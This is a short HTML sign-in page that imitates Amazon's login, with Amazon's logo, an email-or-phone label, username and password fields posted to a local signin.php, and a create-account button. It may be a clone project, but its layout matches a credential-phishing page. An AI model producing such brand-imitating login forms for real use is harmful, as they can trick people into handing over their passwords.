<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Amazon Sign-In</title>
    <link rel="stylesheet" href="/css/styles.css">
</head>
<body>
    <a href="#"><img src="/images/amazon_logo2.png" alt="logo" class="signin-logo"></a>
    <div class="signin-container">
        <h2>Sign In</h2>
        <form class="signin-form" action="signin.php" method="POST">
            <label for="email" class="input-label">Email or mobile phone number</label>
            <input type="text" name="username" placeholder="Username" required><br><br>
            <input type="password" name="password" placeholder="Password" required><br><br>
            <button type="submit">Sign In</button>
        </form>
        <hr class="form-divider">
        <button class="create-account-button">Create your Amazon account</button>
    </div>
</body>
</html>